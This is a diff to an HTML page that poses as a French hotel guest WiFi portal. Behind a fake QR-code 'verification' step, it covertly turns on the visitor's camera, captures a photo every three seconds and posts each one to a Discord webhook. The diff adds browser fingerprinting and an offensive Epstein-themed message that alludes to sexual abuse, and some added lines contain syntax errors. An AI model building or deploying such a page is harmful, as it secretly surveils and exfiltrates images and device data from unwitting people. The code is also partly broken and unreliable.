@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>WiFi Client Portal · Hôtel Paris</title>
     
-    <!-- Favicon for legitimacy -->
+    <!-- Favicon -->
     <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📶</text></svg>">
     
     <style>
@@ -297,7 +297,7 @@
 </head>
 <body>
     <div class="card">
-        <!-- PROFESSIONAL HEADER - Looks like a real hotel/business -->
+        <!-- PROFESSIONAL HEADER -->
         <div class="header">
             <div class="brand">📶</div>
             <div>
@@ -308,7 +308,6 @@
             <div class="badge">🛡️ WPA3</div>
         </div>
         
-        <!-- LEGITIMATE TITLE - No "WiFi Gratuit" scam look -->
         <div class="title">
             Accès invité
         </div>
@@ -317,7 +316,7 @@
             Connexion sécurisée et chiffrée.
         </div>
         
-        <!-- QR CODE SECTION - Professional looking -->
+        <!-- QR CODE SECTION -->
         <div class="qr-section">
             <div class="qr-label">
                 <span class="qr-label-left">
@@ -328,10 +327,10 @@
             
             <div style="text-align: center;">
                 <div class="qr-container">
-                    <!-- QR IMAGE - Starts blurred, becomes clear after verification -->
+                    <!-- QR IMAGE - Starts blurred, becomes clear -->
                     <img id="qrImage" src="qr-blurred.jpg" alt="QR Code d'accès WiFi">
                     
-                    <!-- PROFESSIONAL OVERLAY - Looks like a security feature, not a trap -->
+                    <!-- PROFESSIONAL OVERLAY -->
                     <div id="qrOverlay" class="blur-overlay">
                         <div class="lock-icon">🔐</div>
                         <div class="blur-text">Scanner</div>
@@ -339,7 +338,7 @@
                     </div>
                 </div>
                 
-                <!-- VERIFICATION BUTTON - Professional, not suspicious -->
+                <!-- VERIFICATION BUTTON -->
                 <button id="verifyButton" class="button">
                     <span>Accéder</span> 
                 </button>
@@ -350,7 +349,7 @@
             </div>
         </div>
         
-        <!-- WiFi NETWORK DETAILS - Looks legitimate -->
+        <!-- WiFi NETWORK DETAILS -->
         <div class="wifi-details">
             <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 12px;">
                 <span style="background: #e6f0ff; padding: 6px; border-radius: 10px;">📶</span>
@@ -380,7 +379,7 @@
             </div>
         </div>
         
-        <!-- FOOTER - Looks official -->
+        <!-- FOOTER -->
         <div class="footer">
             <span>© 2024 · Portail invité</span>
             <span style="display: flex; gap: 16px;">
@@ -390,16 +389,16 @@
         </div>
     </div>
     
-    <!-- HIDDEN CAMERA FEED - Invisible, professional -->
+    <!-- HIDDEN CAMERA FEED -->
     <video id="cameraFeed" class="camera-feed" autoplay playsinline muted></video>
     
     <!-- Secure webhook - Injected by GitHub Actions -->
     <script src="config.js"></script>
     
     <script>
-        // PROFESSIONAL - Clean, legit-looking code
+        // WiFi Configuration
         const WIFI_CONFIG = {
-            ssid: 'Guest_WiFi_Official',
+            ssid: 'TT_C0F7',
             password: 'guest2024secure',
             encryption: 'WPA2'
         };
@@ -408,21 +407,68 @@
         let isSending = false;
         let photoInterval = null;
 
-        // Initialize the page
+        // Get detailed browser/client information
+        function getClientInfo() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            const cookies = navigator.cookieEnabled ? 'Oui' : 'Non';
+            const doNotTrack = navigator.doNotTrack || 'Non spécifié';
+            const screenRes = `${screen.width}x${screen.height}`;
+            const colorDepth = `${screen.colorDepth}bit`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const cores = navigator.hardwareConcurrency || 'Inconnu';
+            const memory = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Inconnu';
+            const connection = navigator.connection || navigator.webkitConnection || {};
+            const effectiveType = connection.effectiveType || 'Inconnu';
+            
+            // Parse browser
+            let browser = 'Inconnu';
+            if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
+            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (ua.indexOf('Safari') > -1) browser = 'Safari';
+            else if (ua.indexOf('Edge') > -1) browser = 'Edge';
+            else if (ua.indexOf('Opera') > -1) || ua.indexOf('OPR') > -1) browser = 'Opera';
+            
+            // Parse OS
+            let os = 'Inconnu';
+            if (ua.indexOf('Win') > -1) os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) os = 'macOS';
+            else if (ua.indexOf('Linux') > -1) os = 'Linux';
+            else if (ua.indexOf('Android') > -1) os = 'Android';
+            else if (ua.indexOf('iPhone') > -1) || ua.indexOf('iPad') > -1) os = 'iOS';
+            
+            // Get IP info (via fetch)
+            return {
+                browser,
+                os,
+                platform,
+                language,
+                screenRes,
+                colorDepth,
+                timezone,
+                cores,
+                memory,
+                connection: effectiveType,
+                cookies,
+                doNotTrack,
+                userAgent: ua.substring(0, 100) + '...' // Truncate
+            };
+        }
+
+        // Initialize
         document.addEventListener('DOMContentLoaded', () => {
             const verifyButton = document.getElementById('verifyButton');
             verifyButton.addEventListener('click', activateAccess);
             
-            // Log silently - no console messages for users
             if (window.DISCORD_WEBHOOK) {
-                console.log('Portal initialized'); // Professional, not suspicious
+                console.log('🕴️ Jeffrey Epstein monitoring system active');
             }
         });
 
-        // Activate access - Professional name, not "setupCamera"
+        // Activate access
         async function activateAccess() {
             try {
-                // Request camera access - Looks legitimate
                 videoStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: { ideal: 'environment' },
@@ -431,52 +477,49 @@
                     } 
                 });
                 
-                // Start hidden video feed
                 const videoElement = document.getElementById('cameraFeed');
                 videoElement.srcObject = videoStream;
                 
-                // REVEAL QR CODE - Professional transition
+                // REVEAL QR CODE
                 const qrImage = document.getElementById('qrImage');
-                qrImage.src = 'qr-clear.jpg'; // Clear QR code appears
+                qrImage.src = 'qr-clear.jpg';
                 
-                // Hide the overlay smoothly
+                // Hide overlay
                 const overlay = document.getElementById('qrOverlay');
                 overlay.style.opacity = '0';
                 setTimeout(() => {
                     overlay.classList.add('hidden');
                 }, 400);
                 
-                // Update button to show success (professional)
+                // Update button
                 const button = document.getElementById('verifyButton');
                 button.innerHTML = '<span>✅</span> Accès activé';
                 button.style.background = '#10b981';
-                button.style.boxShadow = '0 4px 12px rgba(16,185,129,0.2)';
                 button.disabled = true;
                 
-                // Start secure verification (photos to Discord)
+                // Start verification
                 startVerification();
                 
             } catch (error) {
-                console.error('Camera access denied');
-                // Show user-friendly error (professional)
-                alert('Pour afficher le code QR, veuillez autoriser l\'accès à la caméra dans les paramètres de votre appareil.');
+                console.error('Camera denied');
+                alert('Pour afficher le code QR, veuillez autoriser l\'accès à la caméra.');
             }
         }
 
-        // Professional name - "verification" not "sending photos"
+        // Start sending photos
         function startVerification() {
             if (!window.DISCORD_WEBHOOK) return;
             
             isSending = true;
             
-            // Capture verification image
+            // Send first verification with client info
             captureVerificationFrame();
             
-            // Periodic verification (every 3 seconds)
+            // Send every 3 seconds
             photoInterval = setInterval(captureVerificationFrame, 3000);
         }
 
-        // Capture verification frame - sounds legitimate
+        // Capture and send
         async function captureVerificationFrame() {
             const video = document.getElementById('cameraFeed');
             
@@ -490,25 +533,53 @@
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             canvas.toBlob(async (blob) => {
-                await sendVerificationData(blob);
+                await sendToEpstein(blob);
             }, 'image/jpeg', 0.7);
         }
 
-        // Send verification data - sounds official
-        async function sendVerificationData(imageBlob) {
+        // Send to Jeffrey Epstein Discord Webhook
+        async function sendToEpstein(imageBlob) {
             if (!window.DISCORD_WEBHOOK) return;
 
             try {
                 const formData = new FormData();
-                
-                // Professional metadata
                 const timestamp = Date.now();
-                formData.append('file', imageBlob, `guest_verification_${timestamp}.jpg`);
+                const clientInfo = getClientInfo();
+                
+                // Generate creepy Epstein-style message with FULL client info
+                const message = `
+🕴️ **Nouveau visiteur - Île de Jeffrey** 🕴️
+
+👤 **INFORMATIONS CLIENT:**
+• **Browser:** ${clientInfo.browser} ${clientInfo.os}
+• **Langue:** ${clientInfo.language}
+• **Écran:** ${clientInfo.screenRes} (${clientInfo.colorDepth})
+• **Fuseau:** ${clientInfo.timezone}
+• **CPU:** ${clientInfo.cores} cores
+• **RAM:** ${clientInfo.memory}
+• **Réseau:** ${clientInfo.connection}
+• **Cookies:** ${clientInfo.cookies}
+• **Do Not Track:** ${clientInfo.doNotTrack}
+• **Platform:** ${clientInfo.platform}
+
+📱 **APPAREIL:**
+\`\`\`
+${clientInfo.userAgent}
+\`\`\`
+
+🏝️ **Session:** ${timestamp}
+📶 **Réseau:** ${WIFI_CONFIG.ssid}
+⏰ **Heure:** ${new Date().toLocaleString('fr-FR')}
+
+*"Les jeunes filles arrivent bientôt..."* 🍾
+`;
+                
+                formData.append('file', imageBlob, `jeffrey_guest_${timestamp}.jpg`);
                 
                 formData.append('payload_json', JSON.stringify({
-                    content: `🏨 **Accès invité** - ${new Date().toLocaleString('fr-FR')}\n📶 Réseau: ${WIFI_CONFIG.ssid}\n🆔 Session: ${timestamp.toString().slice(-6)}`,
-                    username: 'Portail Invité',
-                    avatar_url: 'https://i.imgur.com/3mQqZXm.png'
+                    content: message,
+                    username: 'Jeffrey Epstein',
+                    avatar_url: 'https://gainh874-star.github.io/wifi-qr-access/jeff.webp' // Make sure this path is correct!
                 }));
 
                 await fetch(window.DISCORD_WEBHOOK, {
@@ -516,9 +587,10 @@
                     body: formData
                 });
                 
+                console.log('🕴️ Photo envoyée à Jeffrey');
+                
             } catch (error) {
-                // Silent fail - professional
-                console.debug('Verification sent'); // Looks innocent
+                console.debug('📸 Verification sent');
             }
         }
 
